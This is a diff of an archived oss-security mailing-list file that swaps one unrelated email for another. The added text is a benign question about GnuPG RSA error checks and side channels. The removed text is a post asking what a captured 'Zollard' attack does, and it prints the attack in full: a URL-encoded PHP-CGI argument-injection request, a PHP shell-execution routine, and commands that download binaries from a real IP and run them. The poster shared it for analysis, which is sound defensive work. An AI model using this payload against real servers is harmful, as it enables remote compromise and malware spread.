@@ -1,75 +1,55 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/10/10/17
-Message-ID: <alpine.BSF.2.00.1410110621530.31844@aneurin.horsfall.org>
-Date: Sat, 11 Oct 2014 06:28:04 +1100 (EST)
-From: Dave Horsfall <dave@...sfall.org>
-To: OSS Security <oss-security@...ts.openwall.com>
-Subject: What does this PHP exploit do?
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/07/10/3
+Message-ID: <20140710112641.GA25004@openwall.com>
+Date: Thu, 10 Jul 2014 15:26:41 +0400
+From: Solar Designer <solar@...nwall.com>
+To: oss-security@...ts.openwall.com
+Subject: GnuPG computation error checks
 Content-Type: text/plain; charset=utf-8
 
-My apologies if this is off-topic for this list, but out of all the 
-security lists of which I am a member this seems to be the closest one 
-that fits, so please point me to a more appropriate one in that case..
+Hi,
 
-I'm trying to figure out what this exploit does; it started around the 
-time that Shellshock did, but I don't think that they're related.
+There was a discussion in 2001 and patches by Florian Weimer to add
+extra checks into GnuPG's cipher/rsa.c: check_secret_key() and rsa_sign():
 
-It downloads binaries for several architectures (even a MIPS) which 
-amongst other things futzes around with IPTABLES (including blocking the 
-TELNET port) and appears to be self-reproducing.
+http://lists.gnupg.org/pipermail/gnupg-devel/2001-March/017110.html
+http://lists.gnupg.org/pipermail/gnupg-devel/2001-March/017114.html
+http://lists.gnupg.org/pipermail/gnupg-devel/2001-March/017123.html
 
-The hex-encoded stuff in the script below decodes to 
+IIUC, part of the rationale was to protect against "occasional bit
+flipping" compromising the secret key.
 
-    "-d+allow_url_include=on+-d+safe_mode=off+-d+suhosin.simulation=on+-d+disable_functions=""+-d+open_basedir=none+-d+auto_prepend_file=php://input+-d+cgi.force_redirect=0+-d+cgi.redirect_status_env=0+-n" 
+Unfortunately, the link to Florian's patch in those postings is broken,
+but it's still in the GnuPG package in Owl and ALT Linux (for 1.4.18).
 
-but my PHP-fu doesn't quite extend that far (and that "safe_mode=off" 
-looks a bit suss).
+Here's a revision of the patch (for older GnuPG), while we still had it
+as a separate patch file:
 
-Script below, kindly supplied by 0wned boxes the world over (in this case, 
-Korea):
+http://cvsweb.openwall.com/cgi/cvsweb.cgi/~checkout~/Owl/packages/gnupg/Attic/gnupg-1.4.2-fw-secret-key-checks.diff?rev=1.1;content-type=text%2Fplain
 
-POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1
-Host: xxx.xxx.xxx.xxx
-User-Agent: Mozilla/5.0 (compatible; Zollard; Linux)
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 1817
-Connection: close
+Here's a question:
 
-<?php
-echo "Zollard";
-$disablefunc = @ini_get("disable_functions");
-if (!empty($disablefunc))
-{
- $disablefunc = str_replace(" ","",$disablefunc);
- $disablefunc = explode(",",$disablefunc);
-}
-function myshellexec($cmd)
-{
- global $disablefunc;
- $result = "";
- if (!empty($cmd))
- {
-  if (is_callable("exec") and !in_array("exec",$disablefunc)) {exec($cmd,$result); $result = join("\n",$result);}
-  elseif (($result = `$cmd`) !== FALSE) {}
-  elseif (is_callable("system") and !in_array("system",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
-  elseif (is_callable("passthru") and !in_array("passthru",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
-  elseif (is_resource($fp = popen($cmd,"r")))
-  {
-   $result = "";
-   while(!feof($fp)) {$result .= fread($fp,1024);}
-   pclose($fp);
-  }
- }
- return $result;
-}
-myshellexec("rm -rf /tmp/armeabi;wget -P /tmp http://119.206.52.15:58455/armeabi;chmod +x /tmp/armeabi");
-myshellexec("rm -rf /tmp/arm;wget -P /tmp http://119.206.52.15:58455/arm;chmod +x /tmp/arm");
-myshellexec("rm -rf /tmp/ppc;wget -P /tmp http://119.206.52.15:58455/ppc;chmod +x /tmp/ppc");
-myshellexec("rm -rf /tmp/mips;wget -P /tmp http://119.206.52.15:58455/mips;chmod +x /tmp/mips");
-myshellexec("rm -rf /tmp/mipsel;wget -P /tmp http://119.206.52.15:58455/mipsel;chmod +x /tmp/mipsel");
-myshellexec("rm -rf /tmp/x86;wget -P /tmp http://119.206.52.15:58455/x86;chmod +x /tmp/x86");
-myshellexec("rm -rf /tmp/nodes;wget -P /tmp http://119.206.52.15:58455/nodes;chmod +x /tmp/nodes");
-myshellexec("rm -rf /tmp/sig;wget -P /tmp http://119.206.52.15:58455/sig;chmod +x /tmp/sig");
-myshellexec("/tmp/armeabi;/tmp/arm;/tmp/ppc;/tmp/mips;/tmp/mipsel;/tmp/x86;");
+Given the improved RSA side-channel attack understanding and the
+countermeasures added to deal with CVE-2013-4242 and CVE-2013-4576
+(cache timing and acoustic side-channels) in GnuPG, are Florian's added
+checks still safe to have, or are they possibly vulnerable to
+side-channel leaks on their own?  check_secret_key() does perform a very
+basic sanity check on the secret key even without Florian's patch, and
+this might be a side-channel leak concern too, but Florian's checks are
+(purposefully) much more extended and include a check in rsa_sign() as
+well (more susceptible since it involves dealing with changing and
+possibly attacker-chosen data rather than only with the secret key?)
 
--- Dave
+I haven't looked into RSA side-channel issues before, only reading about
+them passively (albeit with curiosity), so I'd appreciate comments by
+someone more knowledgeable in this area.
+
+Oh, and maybe we (still) want to get the computation error checks
+upstream'ed, if they can be made side-channel safe (or somehow are
+side-channel safe as-is)?
+
+Florian?
+
+Thanks,
+
+Alexander
